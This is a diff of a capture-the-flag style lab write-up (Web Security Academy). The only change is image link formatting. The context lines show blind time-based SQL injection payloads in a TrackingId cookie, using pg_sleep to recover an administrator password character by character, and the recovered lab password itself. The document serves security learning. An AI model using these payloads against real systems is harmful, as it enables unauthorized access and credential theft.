@@ -54,9 +54,9 @@ GET /login HTTP/2
 Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
 Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (length(password)>§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
 ```
-![[Screenshot 2024-05-02 at 6.46.33 PM.png]]
+![Screenshot 2024-05-02 at 6.46.33 PM](images/Screenshot%202024-05-02%20at%206.46.33%20PM.png)
 Based on the *Sniper* attack, I found the following results: 
-![[Screenshot 2024-05-02 at 6.51.18 PM.png]]
+![Screenshot 2024-05-02 at 6.51.18 PM](images/Screenshot%202024-05-02%20at%206.51.18%20PM.png)
 Based on the results, the length of the password is 20 characters excluding the lagged response received (>20s). 
 
 Now it is time to find out the value of each character in the password. 
@@ -68,12 +68,12 @@ Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
 Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
 ...
 ```
-![[Screenshot 2024-05-02 at 7.02.40 PM.png]]
-![[Screenshot 2024-05-02 at 7.03.01 PM.png]]
+![Screenshot 2024-05-02 at 7.02.40 PM](images/Screenshot%202024-05-02%20at%207.02.40%20PM.png)
+![Screenshot 2024-05-02 at 7.03.01 PM](images/Screenshot%202024-05-02%20at%207.03.01%20PM.png)
 I got the following results after filtering by those with ~10s response received: 
-![[Screenshot 2024-05-02 at 7.04.22 PM.png]]
+![Screenshot 2024-05-02 at 7.04.22 PM](images/Screenshot%202024-05-02%20at%207.04.22%20PM.png)
 Piecing together the password, I got : 
 `kjdh0dt60ifw4t456lqr`
 
 Logged in with the credentials!
-![[Screenshot 2024-05-02 at 7.12.31 PM.png]]
+![Screenshot 2024-05-02 at 7.12.31 PM](images/Screenshot%202024-05-02%20at%207.12.31%20PM.png)
